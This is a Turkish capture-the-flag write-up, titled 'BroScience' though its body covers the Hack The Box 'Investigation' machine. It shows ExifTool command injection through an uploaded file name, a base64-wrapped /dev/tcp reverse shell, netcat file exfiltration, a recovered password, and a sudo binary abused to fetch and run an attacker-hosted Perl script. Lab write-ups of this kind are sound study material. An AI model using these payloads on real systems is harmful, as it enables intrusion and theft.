---

title: 🟠 HTB - BroScience
author: Acivik
date: 2023-04-12 18:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, BroScience, walktrough, medium, linux]

---

![https://i.ibb.co/wLdNG02/Investigation.png](https://i.ibb.co/wLdNG02/Investigation.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

`nmap` 22 ssh ve 80 http olmak üzere iki adet açık port bildirir.

```bash
root@acivik:~/ctfs/Investigation-10.129.11.139# nmap -sS -p- 10.129.11.139 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 11:07 GMT
Nmap scan report for 10.129.11.139
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 67.64 seconds
root@acivik:~/ctfs/Investigation-10.129.11.139# nmap -sS -p22,80 10.129.11.139 -sV -sC
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 11:12 GMT
Nmap scan report for 10.129.11.139
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f1e6306aa6ebbcc0d19d4152674c6d9 (RSA)
|   256 274520add2faa73a8373d97c79abf30b (ECDSA)
|_  256 4245eb916e21020617b2748bc5834fe0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://eforenzics.htb/
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.16 seconds
root@acivik:~/ctfs/Investigation-10.129.11.139#
```

OpenSSH ve Apache versiyon bilgilerine göre muhtemelen Ubuntu Focal 20.04 çalışıyor.

`eforenzics.htb` adresini `/etc/hosts` dosyasına ekliyorum.

Vhost olabileceğini düşünerek bir tarama yaptım ve sonuç alamadım.

# <span style="color:#AA0E1C"><b># Enumeration</b></span>

## <span style="color:#0096FF">Web Sitesi - eforenzics.htb</span>

![https://i.ibb.co/pbYDXK4/image.png](https://i.ibb.co/pbYDXK4/image.png)

“Go!” butonu `/service.html` dosyasına gönderir. Başka şeyler bulmak umudu ile kaynak kodlara baktım ve dizin tarması yaptım, önemli bir şey bulamadım.

service.html dosyasında image upload kısmı var.

![https://i.ibb.co/bgtCHGG/image.png](https://i.ibb.co/bgtCHGG/image.png)

Dosya analizi için şu anlık image dosyalarını kabul ettiğini söylüyor.

Test etmek için bir jpg dosyası yükleyeceğim.

![https://i.ibb.co/zGSv5XR/image.png](https://i.ibb.co/zGSv5XR/image.png)

Dosya yüklendiğinde `/analysed_images/` dizini altında `<filename>.txt` adında bir rapor dosyası oluşturuluyor.

Bu dosyada `ExifTool Version:12.37` bilgisini görüyorum ve bununla ilgili bir araştırma yaptığımda command injection zafiyeti bulunduğunu görüyorum.

 

[Command Injection in Exiftool before 12.38](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429)

# <span style="color:#AA0E1C"><b># FootHold - Shell as www-data</b>

Dosya upload ederken `burp suite` ile isteği durdurdum ve dosya ismini `ping -c 5 10.10.14.106 |` olarak değiştirdim.

Gelen ICMP paketlerini görebilmek için tcpdump çalıştırdım.

```bash
root@acivik:~/ctfs/Investigation-10.129.11.139# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:53:40.078325 IP eforenzics.htb > 10.10.14.106: ICMP echo request, id 2, seq 1, length 64
11:53:40.078346 IP 10.10.14.106 > eforenzics.htb: ICMP echo reply, id 2, seq 1, length 64
11:53:41.079052 IP eforenzics.htb > 10.10.14.106: ICMP echo request, id 2, seq 2, length 64
11:53:41.079090 IP 10.10.14.106 > eforenzics.htb: ICMP echo reply, id 2, seq 2, length 64
11:53:42.081111 IP eforenzics.htb > 10.10.14.106: ICMP echo request, id 2, seq 3, length 64
11:53:42.081133 IP 10.10.14.106 > eforenzics.htb: ICMP echo reply, id 2, seq 3, length 64
11:53:43.080198 IP eforenzics.htb > 10.10.14.106: ICMP echo request, id 2, seq 4, length 64
11:53:43.080287 IP 10.10.14.106 > eforenzics.htb: ICMP echo reply, id 2, seq 4, length 64
11:53:44.081116 IP eforenzics.htb > 10.10.14.106: ICMP echo request, id 2, seq 5, length 64
11:53:44.081145 IP 10.10.14.106 > eforenzics.htb: ICMP echo reply, id 2, seq 5, length 64
```

Shell almak için denediğim kodlar muhtemelen bazı karakterlerden dolayı başarısız oluyor bunu bypass etmek için base64 encode kullandım.

```bash
root@acivik:~/ctfs/Investigation-10.129.11.139# echo "bash -i &>/dev/tcp/10.10.14.106/9991 <&1 " | base64
YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjEwNi85OTkxIDwmMSAK
root@acivik:~/ctfs/Investigation-10.129.11.139#
```

Dosya ismini `echo 'YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjEwNi85OTkxIDwmMSAK'| base64 -d| bash |` bu şekilde değiştirdim ve gönderdim.

```bash
root@acivik:~/ctfs/Investigation-10.129.11.139# nc -lnvp 9991
listening on [any] 9991 ...
connect to [10.10.14.106] from (UNKNOWN) [10.129.11.139] 33072
bash: cannot set terminal process group (915): Inappropriate ioctl for device
bash: no job control in this shell
www-data@investigation:~/uploads/1674561534$
```

Sistemdeki kullanıcılar:

```bash
www-data@investigation:/tmp$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
smorton:x:1000:1000:eForenzics:/home/smorton:/bin/bash
www-data@investigation:/tmp$
```

Smorton ve Root var. İlk hedefim smorton kullanıcısına geçebilmek. Bunun için dosyalar arasında gezinerek bir şeyler bulmaya çalışıyorum.

```bash
www-data@investigation:/usr/local/investigation$ ls -la
total 1288
drwxr-xr-x  2 root     root        4096 Sep 30 23:43  .
drwxr-xr-x 11 root     root        4096 Aug 27 21:54  ..
-rw-rw-r--  1 smorton  smorton  1308160 Oct  1 00:35 'Windows Event Logs for Analysis.msg'
-rw-rw-r--  1 www-data www-data       0 Oct  1 00:40  analysed_log
www-data@investigation:/usr/local/investigation$
```

Görünen msg dosyasını kendi makinem üzerine alıp incelemek istiyorum.

Dosyayı aktarmak için netcat kullandım.

```bash
attacker -> nc -lnvp 9992 > windows.msg
box -> nc 10.10.14.106 9992 < 'Windows Event Logs for Analysis.msg'
```

msg dosyasını extract edeceğim.

```bash
root@acivik:~/ctfs/Investigation-10.129.11.139# extract_msg windows.msg 
root@acivik:~/ctfs/Investigation-10.129.11.139# ls
'2022-01-16_0030 Windows Event Logs for Analysis'   windows.msg
root@acivik:~/ctfs/Investigation-10.129.11.139# cd '2022-01-16_0030 Windows Event Logs for Analysis'/
root@acivik:~/ctfs/Investigation-10.129.11.139/2022-01-16_0030 Windows Event Logs for Analysis# ls
evtx-logs.zip  message.txt
root@acivik:~/ctfs/Investigation-10.129.11.139/2022-01-16_0030 Windows Event Logs for Analysis#
```

Bir zip dosyası ve txt dosyası var.

Text içerisinde bir mesaj var ve log dosyasını analiz etmemizi istiyor. Bunun için zip dosyasını unzip ile açacağım.

```bash
root@acivik:~/ctfs/Investigation-10.129.11.139# unzip evtx-logs.zip 
Archive:  evtx-logs.zip
  inflating: security.evtx
```

`evtx_dump.py` ile evtx dosyasını bir txt dosyasına kaydettim.

Log dosyası çok büyük, Smorton ile ilgili bir şey bulabilmeyi umut ediyorum.

# <span style="color:#AA0E1C"><b># PrivEsc: www-data → smorton</b></span>

Bir süre inceledim ve yaptığım filtreleme sonucu ilginç bir şey elde ettim.

```bash
root@acivik:~/ctfs/Investigation-10.129.11.139# cat outlog.txt | grep "TargetUserName" | sort -u | head
<Data Name="TargetUserName">aanderson</Data>
<Data Name="TargetUserName">AAnderson</Data>
<Data Name="TargetUserName">Administrators</Data>
<Data Name="TargetUserName">-</Data>
<Data Name="TargetUserName">Def@ultf0r3nz!csPa$$</Data> # <-- Bu parola olabilir.
<Data Name="TargetUserName">DWM-1</Data>
<Data Name="TargetUserName">DWM-2</Data>
<Data Name="TargetUserName">DWM-3</Data>
<Data Name="TargetUserName">DWM-4</Data>
<Data Name="TargetUserName">DWM-5</Data>
root@acivik:~/ctfs/Investigation-10.129.11.139#
```

Ssh ile oturum açmayı deneyeceğim.

```bash
root@acivik:~/ctfs/Investigation-10.129.11.139# sshpass -p 'Def@ultf0r3nz!csPa$$' ssh smorton@10.129.11.139
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-137-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 24 Jan 2023 01:08:02 PM UTC

  System load:  0.0               Processes:             231
  Usage of /:   60.6% of 3.97GB   Users logged in:       0
  Memory usage: 15%               IPv4 address for eth0: 10.129.11.139
  Swap usage:   0%

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Jan 24 13:07:54 2023 from 10.10.14.106
smorton@investigation:~$
```

# <span style="color:#AA0E1C"><b># PrivEsc: smorton → root</b></span>

İlk olarak `sudo -l` komutunu kontrol ettim.

```bash
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
smorton@investigation:~$
```

binary dosyasını çalıştırmayı denedim.

```bash
smorton@investigation:~$ sudo /usr/bin/binary
Exiting... 
smorton@investigation:~$
```

Birkaç şey denedikten sonra bu elf dosyasını analiz etmeye karar verdim ve kendi makineme transfer ettim.

Ghidra ile açtım.

![https://i.ibb.co/MpcSPGg/image.png](https://i.ibb.co/MpcSPGg/image.png)

Kodu şu şekilde açıklayım:

- Bağımsız değişken sayısı 3 değilse çıkış yapar.
- _Var1 değişkeni yani UID 0 değilse çıkış yapar.
- iVar2 değişkeni ‘lDnxUysaQn’ dizisine eşit değilse çıkış yapar.

Yukarıdaki kontroller geçildiğinde ise belirtilen url’deki veriyi indirir ve perl kullanarak çalıştırır.

Exploit etmek için bir perl dosyası oluşturacağım.

```bash
exec "/bin/bash";
```

priv.pl olarak kaydettim. Şimdi hedef makinede şu kodu çalıştıracağım.

```bash
smorton@investigation:~$ sudo /usr/bin/binary http://10.10.14.106/priv.pl lDnxUysaQn
Running... 
root@investigation:/home/smorton#
```

Artık root.txt dosyasını okuyabilirim.

```bash
root@investigation:/home/smorton# cat /root/root.txt
73fc3d3b85c2e6e8df6ce72756a189c8
root@investigation:/home/smorton#
```
